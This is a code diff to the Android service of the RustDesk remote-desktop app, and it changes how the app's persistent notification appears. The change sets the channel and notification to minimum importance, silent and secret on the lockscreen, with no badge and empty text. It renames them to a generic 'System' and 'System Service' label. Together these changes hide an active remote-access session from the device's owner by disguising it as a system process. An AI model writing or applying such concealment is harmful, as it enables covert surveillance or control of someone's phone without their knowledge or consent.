@@ -578,12 +578,12 @@ class MainService : Service() {
             val channelName = "RustDesk Service"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_HIGH
+                channelName, NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "RustDesk Service Channel"
+                description = "System Service"
+                setShowBadge(false)
             }
-            channel.lightColor = Color.BLUE
-            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
+            channel.lockscreenVisibility = Notification.VISIBILITY_SECRET
             notificationManager.createNotificationChannel(channel)
             channelId
         } else {
@@ -608,14 +608,15 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
-            .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-            .setContentTitle(DEFAULT_NOTIFY_TITLE)
-            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
+            .setDefaults(0)
+            .setAutoCancel(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentTitle("System")
+            .setContentText("")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
-            .setColor(ContextCompat.getColor(this, R.color.primary))
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
             .setWhen(System.currentTimeMillis())
             .build()
         startForeground(DEFAULT_NOTIFY_ID, notification)
